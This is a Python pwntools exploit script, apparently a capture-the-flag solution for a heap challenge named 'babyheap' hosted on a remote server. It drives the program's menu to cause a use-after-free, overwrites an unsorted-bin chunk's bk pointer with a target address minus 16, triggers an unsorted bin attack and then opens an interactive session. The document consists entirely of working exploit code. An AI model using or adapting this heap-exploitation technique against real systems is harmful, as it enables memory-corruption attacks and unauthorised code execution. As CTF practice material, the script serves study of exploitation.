from pwn import *

context.log_level = 'debug'

def add(size,data,title):
    p.sendlineafter('Choice : ', '1')
    p.sendafter("size : " , str(size))
    p.sendafter("data : " , str(data))
    p.sendafter('title :', str(title))

def delete():
    p.sendlineafter('Choice : ', '2')

def give_up(content):
    p.sendlineafter('Choice : ', '3')
    p.sendlineafter('are u sure : ', content)
    
def u_bin_a(size):
    p.sendlineafter('Choice : ', '31337')
    p.sendafter("size : " , str(size))

def secret(size):
    p.sendlineafter('Choice : ', '31337')
    p.sendafter("size : " , str(size))

#p = process('./babyheap')
p = remote('0x0.site', 12214)
e = ELF('./babyheap')
l = e.libc
#l = ELF('./')

pause()
add(0x1010-16, 'a', 'a') 
delete()
give_up('a' * 5) # uaf for stdin structure
delete()
give_up('a' * 8 + p64(0x6020C0 - 16)) # bk = ptr - 16
u_bin_a(0x1010-16) # trigger unsorted bin attack

p.interactive()
